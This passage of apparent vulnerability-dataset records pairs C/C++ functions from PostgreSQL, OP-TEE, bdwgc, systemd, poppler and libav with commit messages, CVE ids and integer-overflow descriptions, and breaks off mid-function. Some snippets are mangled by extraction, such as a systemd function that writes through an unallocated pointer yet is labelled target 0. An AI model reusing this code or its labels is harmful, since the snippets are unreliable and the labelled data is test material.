(%d) exceeds the maximum allowed (%d)\",\n\t\t\t\t\t key_count, (int) (MaxAllocSize / sizeof(Pairs)))));\n\n \tkey_pairs = palloc(sizeof(Pairs) * key_count);\n \n \tfor (i = 0, j = 0; i < key_count; i++)\n\t{\n\t\tif (!key_nulls[i])\n\t\t{\n\t\t\tkey_pairs[j].key = VARDATA(key_datums[i]);\n\t\t\tkey_pairs[j].keylen = VARSIZE(key_datums[i]) - VARHDRSZ;\n\t\t\tkey_pairs[j].val = NULL;\n\t\t\tkey_pairs[j].vallen = 0;\n\t\t\tkey_pairs[j].needfree = 0;\n\t\t\tkey_pairs[j].isnull = 1;\n\t\t\tj++;\n\t\t}\n\t}\n\n\t*npairs = hstoreUniquePairs(key_pairs, j, &bufsiz);\n\n\treturn key_pairs;\n}\n", "func_hash": 319309465075482675382817414964176201220, "file_name": "hstore_op.c", "file_hash": 197009559791074064906893850521721438691, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 194842, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 0, "func": "path_in(PG_FUNCTION_ARGS)\n{\n\tchar\t   *str = PG_GETARG_CSTRING(0);\n\tPATH\t   *path;\n\tint\t\t\tisopen;\n \tchar\t   *s;\n \tint\t\t\tnpts;\n \tint\t\t\tsize;\n\tint\t\t\tbase_size;\n \tint\t\t\tdepth = 0;\n \n \tif ((npts = pair_count(str, ',')) <= 0)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n\t\t\t\t errmsg(\"invalid input syntax for type path: \\\"%s\\\"\", str)));\n\n\ts = str;\n\twhile (isspace((unsigned char) *s))\n\t\ts++;\n\n\t/* skip single leading paren */\n\tif ((*s == LDELIM) && (strrchr(s, LDELIM) == s))\n\t{\n\t\ts++;\n \t\tdepth++;\n \t}\n \n\tbase_size = sizeof(path->p[0]) * npts;\n\tsize = offsetof(PATH, p[0]) + base_size;\n\n\t/* Check for integer overflow */\n\tif (base_size / npts != sizeof(path->p[0]) || size <= base_size)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n\t\t\t\t errmsg(\"too many points requested\")));\n\n \tpath = (PATH *) palloc(size);\n \n \tSET_VARSIZE(path, size);\n\tpath->npts = npts;\n\n\tif ((!path_decode(TRUE, npts, s, &isopen, &s, &(path->p[0])))\n\t&& (!((depth == 0) && (*s == '\\0'))) && !((depth >= 1) && (*s == RDELIM)))\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n\t\t\t\t errmsg(\"invalid input syntax for type path: \\\"%s\\\"\", str)));\n\n\tpath->closed = (!isopen);\n\t/* prevent instability in unused pad bytes */\n\tpath->dummy = 0;\n\n\tPG_RETURN_PATH_P(path);\n}\n", "func_hash": 4264604830547135328074260240370632402, "file_name": "geo_ops.c", "file_hash": 164052151275021855281949818601248030841, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 194929, "project": "optee_os", "commit_id": "7e768f8a473409215fe3fff8f6e31f8a3a0103c6", "project_url": "https://github.com/OP-TEE/optee_os", "commit_url": "https://github.com/OP-TEE/optee_os/commit/7e768f8a473409215fe3fff8f6e31f8a3a0103c6", "commit_message": "core: clear the entire TA area\n\nPreviously we cleared (memset to zero) the size corresponding to code\nand data segments, however the allocation for the TA is made on the\ngranularity of the memory pool, meaning that we did not clear all memory\nand because of that we could potentially leak code and data of a\nprevious loaded TA.\n\nFixes: OP-TEE-2018-0006: \"Potential disclosure of previously loaded TA\ncode and data\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nSuggested-by: Jens Wiklander <jens.wiklander@linaro.org>\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>", "target": 0, "func": "static struct mobj *alloc_ta_mem(size_t size)\n{\n#ifdef CFG_PAGED_USER_TA\n\treturn mobj_paged_alloc(size);\n #else\n \tstruct mobj *mobj = mobj_mm_alloc(mobj_sec_ddr, size, &tee_mm_sec_ddr);\n \n\tif (mobj) {\n\t\tsize_t granularity = BIT(tee_mm_sec_ddr.shift);\n\n\t\t/* Round up to allocation granularity size */\n\t\tmemset(mobj_get_va(mobj, 0), 0, ROUNDUP(size, granularity));\n\t}\n \treturn mobj;\n #endif\n }\n", "func_hash": 98628311870220720119342042056919724718, "file_name": "user_ta.c", "file_hash": 100472334477367567357807977071347386914, "cwe": ["CWE-189"], "cve": "CVE-2019-1010294", "cve_desc": "Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Rounding error. The impact is: Potentially leaking code and/or data from previous Trusted Application. The component is: optee_os. The fixed version is: 3.4.0 and later.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1010294"}
{"idx": 194945, "project": "bdwgc", "commit_id": "be9df82919960214ee4b9d3313523bff44fd99e1", "project_url": "https://github.com/ivmai/bdwgc", "commit_url": "https://github.com/ivmai/bdwgc/commit/be9df82919960214ee4b9d3313523bff44fd99e1", "commit_message": "Fix allocation size overflows due to rounding.\n\n* malloc.c (GC_generic_malloc): Check if the allocation size is\nrounded to a smaller value.\n* mallocx.c (GC_generic_malloc_ignore_off_page): Likewise.", "target": 0, "func": "GC_INNER void * GC_generic_malloc_ignore_off_page(size_t lb, int k)\n{\n    void *result;\n    size_t lg;\n    size_t lb_rounded;\n    word n_blocks;\n    GC_bool init;\n    DCL_LOCK_STATE;\n\n    if (SMALL_OBJ(lb))\n         return(GC_generic_malloc((word)lb, k));\n     lg = ROUNDED_UP_GRANULES(lb);\n     lb_rounded = GRANULES_TO_BYTES(lg);\n    if (lb_rounded < lb)\n        return((*GC_get_oom_fn())(lb));\n     n_blocks = OBJ_SZ_TO_BLOCKS(lb_rounded);\n     init = GC_obj_kinds[k].ok_init;\n     if (EXPECT(GC_have_errors, FALSE))\n      GC_print_all_errors();\n    GC_INVOKE_FINALIZERS();\n    LOCK();\n    result = (ptr_t)GC_alloc_large(ADD_SLOP(lb), k, IGNORE_OFF_PAGE);\n    if (0 != result) {\n        if (GC_debugging_started) {\n            BZERO(result, n_blocks * HBLKSIZE);\n        } else {\n#           ifdef THREADS\n              /* Clear any memory that might be used for GC descriptors */\n              /* before we release the lock.                          */\n                ((word *)result)[0] = 0;\n                ((word *)result)[1] = 0;\n                ((word *)result)[GRANULES_TO_WORDS(lg)-1] = 0;\n                ((word *)result)[GRANULES_TO_WORDS(lg)-2] = 0;\n#           endif\n        }\n    }\n    GC_bytes_allocd += lb_rounded;\n    if (0 == result) {\n        GC_oom_func oom_fn = GC_oom_fn;\n        UNLOCK();\n        return((*oom_fn)(lb));\n    } else {\n        UNLOCK();\n        if (init && !GC_debugging_started) {\n            BZERO(result, n_blocks * HBLKSIZE);\n        }\n        return(result);\n    }\n}\n", "func_hash": 220297858673001672271019933611503304614, "file_name": "mallocx.c", "file_hash": 123389046630789949081658258204068722848, "cwe": ["CWE-189"], "cve": "CVE-2012-2673", "cve_desc": "Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2673"}
{"idx": 194946, "project": "bdwgc", "commit_id": "83231d0ab5ed60015797c3d1ad9056295ac3b2bb", "project_url": "https://github.com/ivmai/bdwgc", "commit_url": "https://github.com/ivmai/bdwgc/commit/83231d0ab5ed60015797c3d1ad9056295ac3b2bb", "commit_message": "Speedup calloc size overflow check by preventing division if small values\n\n* malloc.c (GC_SQRT_SIZE_MAX): New macro.\n* malloc.c (calloc): Add fast initial size overflow check to avoid\ninteger division for reasonably small values passed.", "target": 0, "func": " void * calloc(size_t n, size_t lb)\n {\n    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */\n        && lb && n > GC_SIZE_MAX / lb)\n       return NULL;\n #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */\n         /* libpthread allocated some memory that is only pointed to by  */\n        /* mmapped thread stacks.  Make sure it's not collectable.      */\n        {\n          static GC_bool lib_bounds_set = FALSE;\n          ptr_t caller = (ptr_t)__builtin_return_address(0);\n          /* This test does not need to ensure memory visibility, since */\n          /* the bounds will be set when/if we create another thread.   */\n          if (!EXPECT(lib_bounds_set, TRUE)) {\n            GC_init_lib_bounds();\n            lib_bounds_set = TRUE;\n          }\n          if (((word)caller >= (word)GC_libpthread_start\n               && (word)caller < (word)GC_libpthread_end)\n              || ((word)caller >= (word)GC_libld_start\n                  && (word)caller < (word)GC_libld_end))\n            return GC_malloc_uncollectable(n*lb);\n          /* The two ranges are actually usually adjacent, so there may */\n          /* be a way to speed this up.                                 */\n        }\n#   endif\n    return((void *)REDIRECT_MALLOC(n*lb));\n}\n", "func_hash": 178088042193458978361205800709078318839, "file_name": "malloc.c", "file_hash": 330806026827025861920537430797814995652, "cwe": ["CWE-189"], "cve": "CVE-2012-2673", "cve_desc": "Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2673"}
{"idx": 157925, "project": "systemd", "commit_id": "505b6a61c22d5565e9308045c7b9bf79f7d0517e", "project_url": "https://github.com/systemd/systemd", "commit_url": "https://cgit.freedesktop.org/systemd/systemd/commit/?id=505b6a61c22d5565e9308045c7b9bf79f7d0517e", "commit_message": "journald: don't accept arbitrarily sized journal data fields\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=858746", "target": 0, "func": "void server_process_native_message(\n                Server *s,\n                const void *buffer, size_t buffer_size,\n                struct ucred *ucred,\n                struct timeval *tv,\n                const char *label, size_t label_len) {\n\n        struct iovec *iovec = NULL;\n        unsigned n = 0, m = 0, j, tn = (unsigned) -1;\n        const char *p;\n        size_t remaining;\n        int priority = LOG_INFO;\n        char *identifier = NULL, *message = NULL;\n\n        assert(s);\n        assert(buffer || buffer_size == 0);\n\n        p = buffer;\n        remaining = buffer_size;\n\n        while (remaining > 0) {\n                const char *e, *q;\n\n                e = memchr(p, '\\n', remaining);\n\n                if (!e) {\n                        /* Trailing noise, let's ignore it, and flush what we collected */\n                        log_debug(\"Received message with trailing noise, ignoring.\");\n                        break;\n                }\n\n                if (e == p) {\n                        /* Entry separator */\n                        server_dispatch_message(s, iovec, n, m, ucred, tv, label, label_len, NULL, priority);\n                        n = 0;\n                        priority = LOG_INFO;\n\n                        p++;\n                        remaining--;\n                        continue;\n                }\n\n                if (*p == '.' || *p == '#') {\n                        /* Ignore control commands for now, and\n                         * comments too. */\n                        remaining -= (e - p) + 1;\n                        p = e + 1;\n                        continue;\n                }\n\n                /* A property follows */\n\n                if (n+N_IOVEC_META_FIELDS >= m) {\n                        struct iovec *c;\n                        unsigned u;\n\n                        u = MAX((n+N_IOVEC_META_FIELDS+1) * 2U, 4U);\n                        c = realloc(iovec, u * sizeof(struct iovec));\n                        if (!c) {\n                                log_oom();\n                                break;\n                        }\n\n                        iovec = c;\n                        m = u;\n                }\n\n                q = memchr(p, '=', e - p);\n                if (q) {\n                        if (valid_user_field(p, q - p)) {\n                                size_t l;\n\n                                l = e - p;\n\n                                /* If the field name starts with an\n                                 * underscore, skip the variable,\n                                 * since that indidates a trusted\n                                 * field */\n                                iovec[n].iov_base = (char*) p;\n                                iovec[n].iov_len = l;\n                                n++;\n\n                                /* We need to determine the priority\n                                 * of this entry for the rate limiting\n                                 * logic */\n                                if (l == 10 &&\n                                    memcmp(p, \"PRIORITY=\", 9) == 0 &&\n                                    p[9] >= '0' && p[9] <= '9')\n                                        priority = (priority & LOG_FACMASK) | (p[9] - '0');\n\n                                else if (l == 17 &&\n                                         memcmp(p, \"SYSLOG_FACILITY=\", 16) == 0 &&\n                                         p[16] >= '0' && p[16] <= '9')\n                                        priority = (priority & LOG_PRIMASK) | ((p[16] - '0') << 3);\n\n                                else if (l == 18 &&\n                                         memcmp(p, \"SYSLOG_FACILITY=\", 16) == 0 &&\n                                         p[16] >= '0' && p[16] <= '9' &&\n                                         p[17] >= '0' && p[17] <= '9')\n                                        priority = (priority & LOG_PRIMASK) | (((p[16] - '0')*10 + (p[17] - '0')) << 3);\n\n                                else if (l >= 19 &&\n                                         memcmp(p, \"SYSLOG_IDENTIFIER=\", 18) == 0) {\n                                        char *t;\n\n                                        t = strndup(p + 18, l - 18);\n                                        if (t) {\n                                                free(identifier);\n                                                identifier = t;\n                                        }\n                                } else if (l >= 8 &&\n                                           memcmp(p, \"MESSAGE=\", 8) == 0) {\n                                        char *t;\n\n                                        t = strndup(p + 8, l - 8);\n                                        if (t) {\n                                                free(message);\n                                                message = t;\n                                        }\n                                }\n                        }\n\n                        remaining -= (e - p) + 1;\n                        p = e + 1;\n                        continue;\n                } else {\n                        le64_t l_le;\n                        uint64_t l;\n                        char *k;\n\n                        if (remaining < e - p + 1 + sizeof(uint64_t) + 1) {\n                                log_debug(\"Failed to parse message, ignoring.\");\n                                break;\n                        }\n\n                        memcpy(&l_le, e + 1, sizeof(uint64_t));\n                         memcpy(&l_le, e + 1, sizeof(uint64_t));\n                         l = le64toh(l_le);\n \n                        if (l > DATA_SIZE_MAX) {\n                                log_debug(\"Received binary data block too large, ignoring.\");\n                                break;\n                        }\n\n                        if ((uint64_t) remaining < e - p + 1 + sizeof(uint64_t) + l + 1 ||\n                             e[1+sizeof(uint64_t)+l] != '\\n') {\n                                 log_debug(\"Failed to parse message, ignoring.\");\n                                 break;\n                        }\n\n                        memcpy(k, p, e - p);\n                        k[e - p] = '=';\n                        memcpy(k + (e - p) + 1, e + 1 + sizeof(uint64_t), l);\n\n                        if (valid_user_field(p, e - p)) {\n                                iovec[n].iov_base = k;\n                                iovec[n].iov_len = (e - p) + 1 + l;\n                                n++;\n                        } else\n                                free(k);\n\n                        remaining -= (e - p) + 1 + sizeof(uint64_t) + l + 1;\n                        p = e + 1 + sizeof(uint64_t) + l + 1;\n                }\n        }\n\n        if (n <= 0)\n                goto finish;\n\n        tn = n++;\n        IOVEC_SET_STRING(iovec[tn], \"_TRANSPORT=journal\");\n\n        if (message) {\n                if (s->forward_to_syslog)\n                        server_forward_syslog(s, priority, identifier, message, ucred, tv);\n\n                if (s->forward_to_kmsg)\n                        server_forward_kmsg(s, priority, identifier, message, ucred);\n\n                if (s->forward_to_console)\n                        server_forward_console(s, priority, identifier, message, ucred);\n        }\n\n        server_dispatch_message(s, iovec, n, m, ucred, tv, label, label_len, NULL, priority);\n\nfinish:\n        for (j = 0; j < n; j++)  {\n                if (j == tn)\n                        continue;\n\n                if (iovec[j].iov_base < buffer ||\n                    (const uint8_t*) iovec[j].iov_base >= (const uint8_t*) buffer + buffer_size)\n                        free(iovec[j].iov_base);\n        }\n\n        free(iovec);\n        free(identifier);\n        free(message);\n}\n", "func_hash": 176204361052328684154884966620066714850, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2013-4391", "cve_desc": "Integer overflow in the valid_user_field function in journal/journald-native.c in systemd allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large journal data field, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4391"}
{"idx": 157896, "project": "poppler", "commit_id": "9cf2325fb22f812b31858e519411f57747d39bd8", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb22f812b31858e519411f57747d39bd8", "commit_message": "More gmalloc  gmallocn", "target": 0, "func": "SplashBitmap::SplashBitmap(int widthA, int heightA, int rowPad,\n\t\t\t   SplashColorMode modeA, GBool alphaA,\n\t\t\t   GBool topDown) {\n  width = widthA;\n  height = heightA;\n  mode = modeA;\n  switch (mode) {\n  case splashModeMono1:\n    rowSize = (width + 7) >> 3;\n    break;\n  case splashModeMono8:\n    rowSize = width;\n    break;\n  case splashModeRGB8:\n  case splashModeBGR8:\n    rowSize = width * 3;\n    break;\n  case splashModeXBGR8:\n    rowSize = width * 4;\n    break;\n#if SPLASH_CMYK\n  case splashModeCMYK8:\n    rowSize = width * 4;\n    break;\n#endif\n   }\n   rowSize += rowPad - 1;\n   rowSize -= rowSize % rowPad;\n  data = (SplashColorPtr)gmallocn(rowSize, height);\n   if (!topDown) {\n     data += (height - 1) * rowSize;\n     rowSize = -rowSize;\n   }\n   if (alphaA) {\n    alpha = (Guchar *)gmallocn(width, height);\n   } else {\n     alpha = NULL;\n   }\n}\n", "func_hash": 289196234666330018727696349322887845083, "file_name": "SplashBitmap.cc", "file_hash": 237844712823874855674023111376740102363, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 157897, "project": "poppler", "commit_id": "9cf2325fb22f812b31858e519411f57747d39bd8", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb22f812b31858e519411f57747d39bd8", "commit_message": "More gmalloc  gmallocn", "target": 0, "func": "GBool SplashFTFont::makeGlyph(int c, int xFrac, int yFrac,\n\t\t\t      SplashGlyphBitmap *bitmap, int x0, int y0, SplashClip *clip, SplashClipResult *clipRes) {\n  SplashFTFontFile *ff;\n  FT_Vector offset;\n  FT_GlyphSlot slot;\n  FT_UInt gid;\n  int rowSize;\n  Guchar *p, *q;\n  int i;\n\n  ff = (SplashFTFontFile *)fontFile;\n\n  ff->face->size = sizeObj;\n  offset.x = (FT_Pos)(int)((SplashCoord)xFrac * splashFontFractionMul * 64);\n  offset.y = 0;\n  FT_Set_Transform(ff->face, &matrix, &offset);\n  slot = ff->face->glyph;\n\n  if (ff->codeToGID && c < ff->codeToGIDLen) {\n    gid = (FT_UInt)ff->codeToGID[c];\n  } else {\n    gid = (FT_UInt)c;\n  }\n  if (ff->trueType && gid == 0) {\n    return gFalse;\n  }\n\n#ifdef TT_CONFIG_OPTION_BYTECODE_INTERPRETER\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_BITMAP : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#else\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_HINTING | FT_LOAD_NO_BITMAP\n                       : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#endif\n\n  FT_Glyph_Metrics *glyphMetrics = &(ff->face->glyph->metrics);\n  bitmap->x = splashRound(-glyphMetrics->horiBearingX / 64.0);\n  bitmap->y = splashRound(glyphMetrics->horiBearingY / 64.0);\n  bitmap->w = splashRound(glyphMetrics->width / 64.0);\n  bitmap->h = splashRound(glyphMetrics->height / 64.0);\n\n  *clipRes = clip->testRect(x0 - bitmap->x,\n                            y0 - bitmap->y,\n                            x0 - bitmap->x + bitmap->w,\n                            y0 - bitmap->y + bitmap->h);\n  if (*clipRes == splashClipAllOutside) {\n    bitmap->freeData = gFalse;\n    return gTrue;\n  }\n\n  if (FT_Render_Glyph(slot, aa ? ft_render_mode_normal\n\t\t               : ft_render_mode_mono)) {\n    return gFalse;\n  }\n\n  bitmap->x = -slot->bitmap_left;\n  bitmap->y = slot->bitmap_top;\n  bitmap->w = slot->bitmap.width;\n  bitmap->h = slot->bitmap.rows;\n  bitmap->aa = aa;\n  if (aa) {\n    rowSize = bitmap->w;\n   } else {\n     rowSize = (bitmap->w + 7) >> 3;\n   }\n  bitmap->data = (Guchar *)gmallocn(rowSize, bitmap->h);\n   bitmap->freeData = gTrue;\n   for (i = 0, p = bitmap->data, q = slot->bitmap.buffer;\n        i < bitmap->h;\n       ++i, p += rowSize, q += slot->bitmap.pitch) {\n    memcpy(p, q, rowSize);\n  }\n\n  return gTrue;\n}\n", "func_hash": 268803326177223860938934356529956238901, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 158299, "project": "libav", "commit_id": "0a49a62f998747cfa564d98d36a459fe70d3299b", "project_url": "https://github.com/libav/libav", "commit_url": "https://git.libav.org/?p=libav.git;a=commitdiff;h=0a49a62f998747cfa564d98d36a459fe70d3299b", "commit_message": "h263: Always check both dimensions\n\nCC: libav-stable@libav.org\nFound-By: ago@gentoo.org", "target": 0, "func": " int ff_h263_decode_picture_header(MpegEncContext *s)\n {\n    int format, width, height, i, ret;\n     uint32_t startcode;\n \n     align_get_bits(&s->gb);\n    startcode= get_bits(&s->gb, 22-8);\n\n    for(i= get_bits_left(&s->gb); i>24; i-=8) {\n        startcode = ((startcode << 8) | get_bits(&s->gb, 8)) & 0x003FFFFF;\n\n        if(startcode == 0x20)\n            break;\n    }\n\n    if (startcode != 0x20) {\n        av_log(s->avctx, AV_LOG_ERROR, \"Bad picture start code\\n\");\n        return -1;\n    }\n    /* temporal reference */\n    i = get_bits(&s->gb, 8); /* picture timestamp */\n    if( (s->picture_number&~0xFF)+i < s->picture_number)\n        i+= 256;\n    s->picture_number= (s->picture_number&~0xFF) + i;\n\n    /* PTYPE starts here */\n    if (get_bits1(&s->gb) != 1) {\n        /* marker */\n        av_log(s->avctx, AV_LOG_ERROR, \"Bad marker\\n\");\n        return -1;\n    }\n    if (get_bits1(&s->gb) != 0) {\n        av_log(s->avctx, AV_LOG_ERROR, \"Bad H263 id\\n\");\n        return -1;      /* h263 id */\n    }\n    skip_bits1(&s->gb);         /* split screen off */\n    skip_bits1(&s->gb);         /* camera  off */\n    skip_bits1(&s->gb);         /* freeze picture release off */\n\n    format = get_bits(&s->gb, 3);\n    /*\n        0    forbidden\n        1    sub-QCIF\n        10   QCIF\n        7       extended PTYPE (PLUSPTYPE)\n    */\n\n    if (format != 7 && format != 6) {\n        s->h263_plus = 0;\n        /* H.263v1 */\n         /* H.263v1 */\n         width = ff_h263_format[format][0];\n         height = ff_h263_format[format][1];\n \n         s->pict_type = AV_PICTURE_TYPE_I + get_bits1(&s->gb);\n \n\n        s->h263_long_vectors = get_bits1(&s->gb);\n\n        if (get_bits1(&s->gb) != 0) {\n            av_log(s->avctx, AV_LOG_ERROR, \"H263 SAC not supported\\n\");\n            return -1; /* SAC: off */\n        }\n        s->obmc= get_bits1(&s->gb); /* Advanced prediction mode */\n        s->unrestricted_mv = s->h263_long_vectors || s->obmc;\n\n        s->pb_frame = get_bits1(&s->gb);\n        s->chroma_qscale= s->qscale = get_bits(&s->gb, 5);\n        skip_bits1(&s->gb); /* Continuous Presence Multipoint mode: off */\n\n        s->width = width;\n        s->height = height;\n        s->avctx->sample_aspect_ratio= (AVRational){12,11};\n        s->avctx->framerate = (AVRational){ 30000, 1001 };\n    } else {\n        int ufep;\n\n        /* H.263v2 */\n        s->h263_plus = 1;\n        ufep = get_bits(&s->gb, 3); /* Update Full Extended PTYPE */\n\n        /* ufep other than 0 and 1 are reserved */\n        if (ufep == 1) {\n            /* OPPTYPE */\n            format = get_bits(&s->gb, 3);\n            ff_dlog(s->avctx, \"ufep=1, format: %d\\n\", format);\n            s->custom_pcf= get_bits1(&s->gb);\n            s->umvplus = get_bits1(&s->gb); /* Unrestricted Motion Vector */\n            if (get_bits1(&s->gb) != 0) {\n                av_log(s->avctx, AV_LOG_ERROR, \"Syntax-based Arithmetic Coding (SAC) not supported\\n\");\n            }\n            s->obmc= get_bits1(&s->gb); /* Advanced prediction mode */\n            s->h263_aic = get_bits1(&s->gb); /* Advanced Intra Coding (AIC) */\n            s->loop_filter= get_bits1(&s->gb);\n            s->unrestricted_mv = s->umvplus || s->obmc || s->loop_filter;\n\n            s->h263_slice_structured= get_bits1(&s->gb);\n            if (get_bits1(&s->gb) != 0) {\n                av_log(s->avctx, AV_LOG_ERROR, \"Reference Picture Selection not supported\\n\");\n            }\n            if (get_bits1(&s->gb) != 0) {\n                av_log(s->avctx, AV_LOG_ERROR, \"Independent Segment Decoding not supported\\n\");\n            }\n            s->alt_inter_vlc= get_bits1(&s->gb);\n            s->modified_quant= get_bits1(&s->gb);\n            if(s->modified_quant)\n                s->chroma_qscale_table= ff_h263_chroma_qscale_table;\n\n            skip_bits(&s->gb, 1); /* Prevent start code emulation */\n\n            skip_bits(&s->gb, 3); /* Reserved */\n        } else if (ufep != 0) {\n            av_log(s->avctx, AV_LOG_ERROR, \"Bad UFEP type (%d)\\n\", ufep);\n            return -1;\n        }\n\n        /* MPPTYPE */\n        s->pict_type = get_bits(&s->gb, 3);\n        switch(s->pict_type){\n        case 0: s->pict_type= AV_PICTURE_TYPE_I;break;\n        case 1: s->pict_type= AV_PICTURE_TYPE_P;break;\n        case 2: s->pict_type= AV_PICTURE_TYPE_P;s->pb_frame = 3;break;\n        case 3: s->pict_type= AV_PICTURE_TYPE_B;break;\n        case 7: s->pict_type= AV_PICTURE_TYPE_I;break; //ZYGO\n        default:\n            return -1;\n        }\n        skip_bits(&s->gb, 2);\n        s->no_rounding = get_bits1(&s->gb);\n        skip_bits(&s->gb, 4);\n\n        /* Get the picture dimensions */\n        if (ufep) {\n            if (format == 6) {\n                /* Custom Picture Format (CPFMT) */\n                s->aspect_ratio_info = get_bits(&s->gb, 4);\n                ff_dlog(s->avctx, \"aspect: %d\\n\", s->aspect_ratio_info);\n                /* aspect ratios:\n                0 - forbidden\n                1 - 1:1\n                2 - 12:11 (CIF 4:3)\n                3 - 10:11 (525-type 4:3)\n                4 - 16:11 (CIF 16:9)\n                5 - 40:33 (525-type 16:9)\n                6-14 - reserved\n                */\n                width = (get_bits(&s->gb, 9) + 1) * 4;\n                skip_bits1(&s->gb);\n                height = get_bits(&s->gb, 9) * 4;\n                ff_dlog(s->avctx, \"\\nH.263+ Custom picture: %dx%d\\n\",width,height);\n                if (s->aspect_ratio_info == FF_ASPECT_EXTENDED) {\n                    /* aspected dimensions */\n                    s->avctx->sample_aspect_ratio.num= get_bits(&s->gb, 8);\n                    s->avctx->sample_aspect_ratio.den= get_bits(&s->gb, 8);\n                }else{\n                    s->avctx->sample_aspect_ratio= ff_h263_pixel_aspect[s->aspect_ratio_info];\n                }\n            } else {\n                width = ff_h263_format[format][0];\n                height = ff_h263_format[format][1];\n                s->avctx->sample_aspect_ratio= (AVRational){12,11};\n            }\n            if ((width == 0) || (height == 0))\n                return -1;\n            s->width = width;\n            s->height = height;\n\n            if(s->custom_pcf){\n                int gcd;\n                s->avctx->framerate.num  = 1800000;\n                s->avctx->framerate.den  = 1000 + get_bits1(&s->gb);\n                s->avctx->framerate.den *= get_bits(&s->gb, 7);\n            